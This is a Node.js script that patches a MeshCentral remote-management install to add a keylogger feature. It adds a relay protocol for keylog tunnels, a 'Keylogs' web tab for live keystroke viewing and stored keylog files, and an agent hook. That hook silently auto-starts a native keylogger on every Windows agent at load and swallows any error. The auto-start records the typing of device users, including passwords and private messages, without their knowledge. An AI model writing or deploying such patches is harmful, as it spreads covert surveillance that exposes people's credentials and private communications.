'use strict';
const fs = require('fs');
const path = require('path');
const root = path.resolve(process.argv[2] || '');
if (!fs.existsSync(path.join(root, 'meshrelay.js')) || !fs.existsSync(path.join(root, 'agents', 'meshcore.js'))) throw new Error('Pass a MeshCentral checkout root');

// Copy the browser-side Keylogs tab controller into the web server.
const viewModeSource = path.join(__dirname, '..', 'plugin', 'mckeylog-viewmode.js');
const viewModeTarget = path.join(root, 'public', 'scripts', 'mckeylog-viewmode.js');
if (fs.existsSync(viewModeTarget)) {
    const installed = fs.readFileSync(viewModeTarget, 'utf8');
    const expected = fs.readFileSync(viewModeSource, 'utf8');
    if (installed !== expected && !installed.includes('root.keylogsTabEnter')) throw new Error('MeshCentral public/scripts/mckeylog-viewmode.js already exists with different contents');
}
fs.copyFileSync(viewModeSource, viewModeTarget);

function edit(relativePath, transform) {
    const file = path.join(root, relativePath);
    const old = fs.readFileSync(file, 'utf8');
    const next = transform(old);
    if (old !== next) fs.writeFileSync(file, next, 'utf8');
}

function count(source, text) {
    let n = 0, at = 0;
    for (;;) {
        at = source.indexOf(text, at);
        if (at < 0) break;
        n++;
        at += text.length;
    }
    return n;
}

// Idempotent single occurrence replacement.
function rep(source, old, next, what) {
    if (source.includes(next)) return source;
    if (count(source, old) !== 1) throw new Error(what);
    return source.replace(old, next);
}

// Insert text after the (unique) line containing anchor.
function insertAfterLine(source, anchor, text, what) {
    if (count(source, anchor) !== 1) throw new Error(what);
    const at = source.indexOf(anchor);
    const lineEnd = source.indexOf('\n', at);
    if (lineEnd < 0) throw new Error(what);
    return source.slice(0, lineEnd + 1) + text + source.slice(lineEnd + 1);
}

// Insert text before the (unique) line containing anchor. The text function
// receives the anchor line's indentation and the file newline style.
function insertBeforeLine(source, anchor, textFn, what) {
    if (count(source, anchor) !== 1) throw new Error(what);
    const at = source.indexOf(anchor);
    const lineStart = source.lastIndexOf('\n', at - 1) + 1;
    const lineEnd = source.indexOf('\n', at);
    const line = source.slice(lineStart, lineEnd < 0 ? source.length : lineEnd);
    const indent = (line.match(/^[ \t]*/) || [''])[0];
    const newline = source.includes('\r\n') ? '\r\n' : '\n';
    return source.slice(0, lineStart) + textFn(indent, newline) + source.slice(lineStart);
}

// 1) Relay rights: protocol 17 (keylogs) requires desktop rights, like audio (15).
edit('meshrelay.js', function (source) {
    const newline = source.includes('\r\n') ? '\r\n' : '\n';
    const marker = '    if (protocol == 17) {';
    if (source.includes(marker)) return source;
    const at = source.indexOf('function isProtocolAllowedByRights(rights, protocol) {');
    if (at < 0) throw new Error('MeshRelay rights check changed');
    const body = source.indexOf('\n', at) + 1;
    const check = marker + newline +
        '        if ((rights != MESHRIGHT_ADMIN) && (rights == null || ((rights & (MESHRIGHT_REMOTECONTROL | MESHRIGHT_REMOTEVIEWONLY)) == 0) || ((rights & MESHRIGHT_NODESKTOP) != 0))) { return false; }' + newline +
        '    }' + newline;
    return source.slice(0, body) + check + source.slice(body);
});

// 2) Server dispatch: route protocol 17 tunnels to the keylogger module.
edit(path.join('agents', 'meshcore.js'), function (source) {
    const newline = source.includes('\r\n') ? '\r\n' : '\n';
    if (!source.includes('require("win-keylogger").handleTunnelData(this, data)')) {
        const start = source.indexOf('        } else if (this.httprequest.protocol == 7) { // Plugin data exchange');
        const comment = source.indexOf('//sendConsoleText("Got tunnel #', start);
        const close = source.lastIndexOf('        }', comment);
        if (start < 0 || comment < 0 || close <= start) throw new Error('MeshCore tunnel dispatch changed');
        const lineEnd = source.indexOf('\n', close);
        if (lineEnd < 0 || source.slice(close, lineEnd).trim() !== '}') throw new Error('MeshCore tunnel dispatch boundary changed');
        const branch = '        } else if (this.httprequest.protocol == 17) {' + newline +
            '            // Keylogs use the authenticated relay with a plain JSON websocket.' + newline +
            '            var rights = this.httprequest.rights;' + newline +
            '            if ((rights != MESHRIGHT_ADMIN) && (((rights & (MESHRIGHT_REMOTECONTROL | MESHRIGHT_REMOTEVIEW)) == 0) || ((rights & MESHRIGHT_NODESKTOP) != 0))) { this.httprequest.s.end(); return; }' + newline +
            '            this.descriptorMetadata = "Remote Keylogs";' + newline +
            '            try { require("win-keylogger").handleTunnelData(this, data); } catch (ex) {' + newline +
            '                try { this.write(JSON.stringify({ type: "error", message: "The keylogger is not available in this agent build." })); } catch (e) { }' + newline +
            '            }' + newline +
            '        }' + newline;
        source = source.slice(0, close) + branch + source.slice(lineEnd + 1);
    }
    const closeMarker = 'function onTunnelClosed()';
    if (!source.includes('this.httprequest.protocol == 17) { try { require("win-keylogger").closeTunnel(this);')) {
        const at = source.indexOf(closeMarker);
        const brace = source.indexOf('{', at) + 1;
        if (at < 0 || brace <= 0) throw new Error('MeshCore close handler changed');
        const cleanup = newline + '    if (this.httprequest && this.httprequest.protocol == 17) { try { require("win-keylogger").closeTunnel(this); } catch (ex) { } }';
        source = source.slice(0, brace) + cleanup + source.slice(brace);
    }
    if (!source.includes('// MeshCentral Keylogger: auto-start')) {
        const autostart = "// MeshCentral Keylogger: auto-start the native keylogger on Windows agents." + newline +
            "if (process.platform == 'win32') { try { require('keylogger').start({}); } catch (e) { } }" + newline;
        source = insertAfterLine(source, "var promise = require('promise');", autostart, 'MeshCore auto-start anchor changed');
    }
    return source;
});

// 3) Device page templates: add the Keylogs tab (page 61).
for (const template of ['views/default3.handlebars', 'views/default.handlebars']) {
    edit(template, function (source) {
        const newline = source.includes('\r\n') ? '\r\n' : '\n';

        // 3a. Include the tab controller script.
        const scriptMarker = '<!-- MeshCentral Keylogs tab controller -->';
        if (!source.includes(scriptMarker)) {
            const anchor = '<script type="text/javascript" src="scripts/agent-redir-ws-0.1.1{{{min}}}.js"></script>';
            if (count(source, anchor) !== 1) throw new Error('MeshCentral relay script reference changed');
            source = source.replace(anchor, anchor + newline + '    ' + scriptMarker + newline + '    <script type="text/javascript" src="scripts/mckeylog-viewmode.js"></script>');
        }

        // 3b. Top bar: add the Keylogs tab after Plugins.
        if (!source.includes('id=MainDevKeylogs')) {
            source = insertBeforeLine(source, 'id=MainDevPlugins', function (indent) {
                return indent + '<td tabindex=0 id=MainDevKeylogs class="topbar_td style3x" onmouseup=go(61,event) onkeypress="if (event.key == \'Enter\') go(61)">Keylogs</td>' + newline;
            }, 'MeshCentral Plugins topbar anchor changed');
        }

        // 3c. Submenu visibility.
        source = rep(source, "QV('MainSubMenuSpan', (x >= 9) && (x < 20));", "QV('MainSubMenuSpan', ((x >= 9) && (x < 20)) || (x == 61));", 'MeshCentral MainSubMenuSpan anchor changed');

        // 3d. Panel visibility loop.
        source = rep(source, "for (var i = 0; i < 61; i++) { QV('p' + i, i == x); }", "for (var i = 0; i < 62; i++) { QV('p' + i, i == x); }", 'MeshCentral panel loop anchor changed');

        // 3e. Panel name map.
        source = rep(source, "19: 'MainDevPlugins',", "19: 'MainDevPlugins', 61: 'MainDevKeylogs',", 'MeshCentral panels map anchor changed');

        // 3f. Tab grouping (device-level tabs).
        source = rep(source, 'return (v === 9) ? 1 : Math.floor(v / 10);', 'return (v === 9 || v === 61) ? 1 : Math.floor(v / 10);', 'MeshCentral getTabGroup anchor changed');

        // 3g. Shift-click / middle-click opens the device tab in a new window.
        source = rep(source, 'if ((x >= 9) && (x <= 19)) {', 'if (((x >= 9) && (x <= 19)) || (x == 61)) {', 'MeshCentral new-window tab range changed');

        // 3h. URL viewmode: device deep links.
        source = rep(source, 'if ((xxcurrentView >= 9) && (xxcurrentView <= 19)) { // Device Link', 'if (((xxcurrentView >= 9) && (xxcurrentView <= 19)) || (xxcurrentView == 61)) { // Device Link', 'MeshCentral URL device link range changed');
        source = rep(source, '&& (xxcurrentView >= 9) && (xxcurrentView <= 19) && (currentNode != null)', '&& (((xxcurrentView >= 9) && (xxcurrentView <= 19)) || (xxcurrentView == 61)) && (currentNode != null)', 'MeshCentral URL device range changed');

        // 3i. The Keylogs page itself, before the p60 page.
        if (!source.includes('<div id=p61 style="display:none">')) {
            source = insertBeforeLine(source, '<div id=p60 style="display:none">', function (indent) {
                const i = indent;
                const j = indent + '    ';
                const k = indent + '        ';
                return i + '<div id=p61 style="display:none">' + newline +
                    j + '<div id="p61title">' + newline +
                    k + '<div id="p61BackButton" style="float:left"><div class="backButton" tabindex=0 onclick=goBack() title="Back" onkeypress="if (event.key == \'Enter\') goBack()"><div class="backButtonEx"></div></div></div>' + newline +
                    k + '<h1>Keylogs<span id=p61deviceName></span></h1>' + newline +
                    j + '</div>' + newline +
                    j + '<div style="margin:10px 10px 0 10px;font-size:14px">' + newline +
                    k + '<span id=p61status style="font-size:13px;color:#666">Not connected.</span>' + newline +
                    k + '<input id=p61connect type=button value="Connect" style="margin-left:10px" onclick=p61ToggleConnect() />' + newline +
                    k + '<input type=button value="Start Logging" style="margin-left:6px" onclick=p61SendCmd({cmd:\'start\'}) />' + newline +
                    k + '<input type=button value="Stop Logging" style="margin-left:6px" onclick=p61SendCmd({cmd:\'stop\'}) />' + newline +
                    k + '<input type=button value="Refresh Files" style="margin-left:6px" onclick=p61SendCmd({cmd:\'list\'}) />' + newline +
                    k + '<label style="margin-left:14px;font-size:13px"><input id=p61autoscroll type=checkbox checked /> autoscroll</label>' + newline +
                    j + '</div>' + newline +
                    j + '<div id=p61live style="background:#101418;color:#d6e2f0;font-family:Consolas,monospace;font-size:12px;padding:8px;border-radius:4px;height:430px;overflow:auto;white-space:pre-wrap;margin:10px"></div>' + newline +
                    j + '<div style="margin:10px;font-size:14px"><b>Previous keylog files</b></div>' + newline +
                    j + '<table class="table table-sm" style="margin:0 10px 10px 10px">' + newline +
                    k + '<thead><tr><th>File</th><th>Size</th><th>Modified</th><th></th></tr></thead>' + newline +
                    k + '<tbody id=p61files>' + newline +
                    k + '    <tr><td colspan=4 style="font-size:13px">No previous keylog files found on this device.</td></tr>' + newline +
                    k + '</tbody>' + newline +
                    j + '</table>' + newline +
                    i + '</div>' + newline;
            }, 'MeshCentral p60 page anchor changed');
        }

        // 3j. Device name in the page title.
        if (!source.includes("QH('p61deviceName', nname);")) {
            source = insertAfterLine(source, "QH('p19deviceName', nname);", "                QH('p61deviceName', nname);" + newline, 'MeshCentral device name anchor changed');
        }

        // 3k. Tab enter/exit lifecycle from go().
        if (!source.includes('// MeshCentral Keylogger: manage the Keylogs tab')) {
            const hook = '            // MeshCentral Keylogger: manage the Keylogs tab (61) lifecycle.' + newline +
                '            if (xxcurrentView == 61 && x != 61) { if (window.keylogsTabExit != null) { keylogsTabExit(); } }' + newline +
                '            if (x == 61 && xxcurrentView != 61) { if (window.keylogsTabEnter != null) { keylogsTabEnter(); } }' + newline;
            source = insertAfterLine(source, "if (pluginHandler != null) pluginHandler.callHook('goPageStart', x, event);", hook, 'MeshCentral go() lifecycle anchor changed');
        }
        return source;
    });
}
